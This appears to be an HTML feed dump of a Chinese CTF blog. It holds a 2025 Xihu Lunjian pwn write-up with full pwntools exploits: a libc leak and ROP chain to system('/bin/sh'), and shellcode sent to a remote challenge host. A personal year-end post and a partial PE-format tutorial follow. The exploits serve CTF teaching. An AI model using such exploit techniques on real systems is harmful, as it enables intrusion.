punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;bypass&quot;&gt;&lt;a href=&quot;#bypass&quot; class=&quot;headerlink&quot; title=&quot;bypass&quot;&gt;&lt;/a&gt;bypass&lt;/h2&gt;&lt;p&gt;main 函数中输入格式不正确的时候会输出 puts 函数地址，泄露 libc 地址，输入长度为 4 内容为</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025西湖论剑-PWN</title>
    <link href="https://starrysky1004.github.io/2025/01/18/2025-xi-hu-lun-jian-pwn/2025-xi-hu-lun-jian-pwn/"/>
    <id>https://starrysky1004.github.io/2025/01/18/2025-xi-hu-lun-jian-pwn/2025-xi-hu-lun-jian-pwn/</id>
    <published>2025-01-18T11:01:11.000Z</published>
    <updated>2025-01-18T11:23:47.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h2><p>使用 c++ 的 vector 通过菜单选择对 vector 进行 push、pop、edit、show 操作，vector 容器中每个元素占 4 位，第六个元素存放了元素的个数</p><p>在 push 操作中会将元素个数 +1</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall add(__int64 vec, int *index)&#123;  int idx; &#x2F;&#x2F; ecx  __int64 num; &#x2F;&#x2F; rax  idx &#x3D; *index;  num &#x3D; *(_QWORD *)(vec + 24);  *(_QWORD *)(vec + 24) &#x3D; num + 1;  *(_DWORD *)(vec + 4 * num) &#x3D; idx;  return num;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而在 edit 的时候判断下标是否合法的依据就是第六位的元素个数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall get_edit_addr(__int64 vec, unsigned __int64 index)&#123;  std::out_of_range *exception; &#x2F;&#x2F; rbx  if ( index &gt;&#x3D; *(_QWORD *)(vec + 24) )  &#123;    exception &#x3D; (std::out_of_range *)__cxa_allocate_exception(0x10uLL);    std::out_of_range::out_of_range(exception, &quot;Index out of range&quot;);    __cxa_throw(      exception,      (struct type_info *)&amp;&#96;typeinfo for&#39;std::out_of_range,      (void (*)(void *))&amp;std::out_of_range::~out_of_range);  &#125;  return 4 * index + vec;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时 show 操作输出的元素个数也是 vector 第六位的元素数量</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall show(__int64 vec)&#123;  __int64 v1; &#x2F;&#x2F; rax  unsigned __int64 i; &#x2F;&#x2F; [rsp+18h] [rbp-8h]  std_cout(&amp;cout, &quot;StackVector contents: &quot;);  for ( i &#x3D; 0LL; i &lt; *(_QWORD *)(vec + 24); ++i )  &#123;    v1 &#x3D; std::ostream::operator&lt;&lt;(&amp;cout, *(unsigned int *)(vec + 4 * i));    std_cout(v1, &quot; &quot;);  &#125;  return std::ostream::operator&lt;&lt;(&amp;cout, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是程序是 64 位的，所以实际在取元素数量的时候是和前一位拼接起来取 8 位的，例如前一位是 00000008，第六位是 00000008，那么实际取的大小就是800000008，这样就可以越界写栈内存以及越界 show 了，但是 show 的时候会一直输出到元素数量这么长，就会读到不存在的内存造成 eof，所以还需要控制这个大小，之后就能正常输出栈内存泄露 libc 以及在返回地址写 rop 了</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.155.126.78'</span><span class="token punctuation">,</span> <span class="token number">23091</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'push'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'edit'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'value'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'StackVector contents: '</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>num1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>num2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> num2 <span class="token operator">*</span> <span class="token number">0x100000000</span> <span class="token operator">+</span> num1 <span class="token operator">-</span> <span class="token number">0x29d90</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e5</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>head <span class="token operator">=</span> <span class="token punctuation">(</span>libc_base <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>edit<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>pop_rdi_ret <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> pop_rdi_ret <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> binsh <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> system <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h2><p>非预期直接发shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.155.126.78'</span><span class="token punctuation">,</span> <span class="token number">22502</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Vpwn&quot;&gt;&lt;a href=&quot;#Vpwn&quot; class=&quot;headerlink&quot; title=&quot;Vpwn&quot;&gt;&lt;/a&gt;Vpwn&lt;/h2&gt;&lt;p&gt;使用 c++ 的 vector 通过菜单选择对 vector 进行 push、pop、edit、show 操作，vector</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/"/>
    <id>https://starrysky1004.github.io/2025/01/02/2024-nian-zhong-zong-jie/</id>
    <published>2025-01-02T08:45:26.000Z</published>
    <updated>2025-01-02T10:38:17.672Z</updated>
    
    <content type="html"><![CDATA[<p>今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实践中学会了awd赛制的打法和批量脚本的编写；在basectf和moectf中学了一个月的web基础；学了半个月kernel基础；跟着z1r0师傅复现了一些cve并且跟着参与了漏洞挖掘实战，学到了IDA动调和windbg动调；年底开始接触RW，目前也就学了一些angr、afl基础用法、IoT基础知识、pe文件结构、压缩注入。这一年的学习过程中很感谢<a href="https://www.cnblogs.com/ve1kcon#/">ve1</a>宝和<a href="https://www.z1r0.top/">z1r0</a>师傅的指导，在我不知道该怎么继续的时候一直是他们在给我鼓励带着我往前。</p><p>这一年也有很多新奇的经历，去了青岛、广州、长沙、上海、北京、贵阳、西安、华山，第一次在网吧过夜，第一次自己一个人坐火车，久违的和妈妈一起去旅游。大学最大的收获除了网安就是长了很多见识，去了很多城市；接任了校队队长之后也学会了团队协作管理，包括在招新的过程中遇到各种各样的人和问题，对于社恐的我来说还挺有挑战性的。年初的时候一时兴起做起了up主，没想到真的有很多人会关注我，现在也有2.4k粉丝啦，也由此认识了一些师傅，在和他们的交流中学到了很多，下半年开始了《重生之我在yctu做pwn手》系列，pwn方向入门感觉挺难的，希望能帮助以后开始学pwn的师傅入门。年初的时候还加入了联队0xFFF，联队的师傅们真的好强啊，对我来说觉得很难很难的比赛很多都是联队的师傅们在出题。</p><p>还有最开心的事就是认识了ve1宝，在香山杯的时候被ve1宝注意到，然后在长城杯第一次面基拍了个合照，以为以后不会有什么交集呢，后来在机缘巧合下又聊了起来，感觉ve1宝真的超级温柔欸，会为我考虑能理解我的感受，而且还是大帅哥，花痴ing（x。再次见面是在上海市赛，和ve1宝在上海玩了一天，外滩那家蟹黄面真好吃aaa，后来ve1宝去北京实习啦，还路过盐城找我玩了几天，大三课少，拼拼凑凑假期多的时候我也去了几次北京，和ve1宝双排打比赛，谁懂啊，有个方向一致志同道合的对象感觉真的超棒！后面青岛和贵阳的比赛ve1宝还特地飞来找我玩，一起去看了很多风景。</p><p>2025的计划就是继续学pwn，多接触一些其他知识拓宽知识面，重点放在RW的学习，希望2025能找到一份合适的实习，CTF水平能配得上战队，还有能和我的ve1宝一直好好的欸嘿。</p><p>最后放点今年拍的照片~</p><img src="/2025/01/02/2024-nian-zhong-zong-jie/1.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/2.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/3.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/4.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/5.jpg" class><img src="/2025/01/02/2024-nian-zhong-zong-jie/6.jpg" class>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今年学的东西很零散，PWN、WEB、RW、渗透、web开发都有接触，感觉有点学习思路混乱导致浪费了很多时间，但也算有所收获：在beginctf、sictf、羊城杯、源鲁杯中学到一些pwn的新知识，例如侧信道、llvm pass、protobuf；在长城杯和上海大学生市赛的实</summary>
      
    
    
    
    
    <category term="年终总结" scheme="https://starrysky1004.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构与压缩注入</title>
    <link href="https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/"/>
    <id>https://starrysky1004.github.io/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/</id>
    <published>2024-12-16T16:37:42.834Z</published>
    <updated>2024-12-19T08:45:55.857Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE : Portable Executable 可移植的可执行文件，Windows 操作系统下的可执行文件（exe，scr）、动态链接库（dll，oxc，cpl）、驱动程序（sys，vxd）的总称</p><h3 id="DOS头：DOS-Header-DOS-Stub"><a href="#DOS头：DOS-Header-DOS-Stub" class="headerlink" title="DOS头：DOS Header + DOS Stub"></a>DOS头：DOS Header + DOS Stub</h3><p><strong>DOS Header</strong> 结构体（0x40），用于向后兼容早期的 MS-DOS</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE 文件头结构体</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// 标识符，用于确认这是MZ格式的文件，值为0x5A4D</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// 文件中最后一个扇区的字节数</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// 文件中的扇区总数</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// 重定位表中的条目数</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// 文件头的大小，以16字节为单位</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最小额外内存段落数</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// 程序加载时所需的最大额外内存段落数</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈段选择子（段地址）</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// 初始堆栈指针值</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// 校验和，用于检验文件的完整性</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// 初始指令指针（IP值）</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// 初始代码段选择子（段地址）</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// 文件中重定位表的偏移量</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// 覆盖号，用于实现覆盖功能</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// 保留字段，供未来使用</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM标识符，用于特定于OEM的扩展</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM信息，供OEM使用</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// 保留字段，供未来扩展使用</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// 指向新EXE（PE）头的偏移量，从文件开始处计算</span><span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注：</p><ul><li>e_magic：位于文件首，确认是 MZ 格式文件，对应 ascii 的 MZ </li><li>e_lfanew：PE 头偏移地址，e_lfanew &#x3D; 80，对应 0080h 处</li></ul><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181546947.png" class><p><strong>DOS Stub</strong> 编译器自动生成，由代码和数据混合而成，大小不固定，在不支持 PE 文件格式的操作系统中会显示一个错误提示，在 Windows 中不运行，在 DOS 中会运行</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212181643899.png" class><h3 id="PE-头：-NT-头-节表区"><a href="#PE-头：-NT-头-节表区" class="headerlink" title="PE 头： NT 头 + 节表区"></a>PE 头： NT 头 + 节表区</h3><h4 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h4><p>PE 文件的核心部分，包含关于可执行文件的重要信息。开始位置由 e_lfanew 指定</p><p>32位中 NT 结构体 _IMAGE_NT_HEADERS 如下（0xf8）：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>    DWORD Signature<span class="token punctuation">;</span>  <span class="token comment">// PE签名，0x4字节</span>    IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span>  <span class="token comment">// PE头，0x14字节</span>    IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// PE可选头</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PE 头结构体 _IMAGE_FILE_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>    WORD Machine<span class="token punctuation">;</span>  <span class="token comment">// 目标机器的类型码，如x86或ARM</span>    WORD NumberOfSections<span class="token punctuation">;</span>  <span class="token comment">// 文件中节(section)的数量</span>    DWORD TimeDateStamp<span class="token punctuation">;</span>  <span class="token comment">// 文件创建或最后修改的时间戳</span>    DWORD PointerToSymbolTable<span class="token punctuation">;</span>  <span class="token comment">// 指向文件中符号表的偏移地址</span>    DWORD NumberOfSymbols<span class="token punctuation">;</span>  <span class="token comment">// 符号表中符号条目的数量</span>    WORD SizeOfOptionalHeader<span class="token punctuation">;</span>  <span class="token comment">// 可选头的大小，用于存储扩展的文件信息</span>    WORD Characteristics<span class="token punctuation">;</span>  <span class="token comment">// 文件特性标志，指DLL、应用程序、可执行文件等</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212182821992.png" class><p>PE 可选头结构体 _IMAGE_OPTIONAL_HEADER 如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span> <span class="token expression"><span class="token number">16</span>  </span><span class="token comment">// 数据目录项数，固定为16</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 标准域</span>    WORD Magic<span class="token punctuation">;</span>  <span class="token comment">// 可选头类型，0x10表示32位，0x20表示64位</span>    BYTE MajorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 主链接器的版本号，以字节为单位</span>    BYTE MinorLinkerVersion<span class="token punctuation">;</span>  <span class="token comment">// 副链接器的版本号，以字节为单位</span>    DWORD SizeOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段大小，以字节为单位</span>    DWORD SizeOfInitializedData<span class="token punctuation">;</span>  <span class="token comment">// 初始化数据段大小，以字节为单位</span>    DWORD SizeOfUninitializedData<span class="token punctuation">;</span>  <span class="token comment">// 未初始化数据段大小，以字节为单位</span>    DWORD AddressOfEntryPoint<span class="token punctuation">;</span>  <span class="token 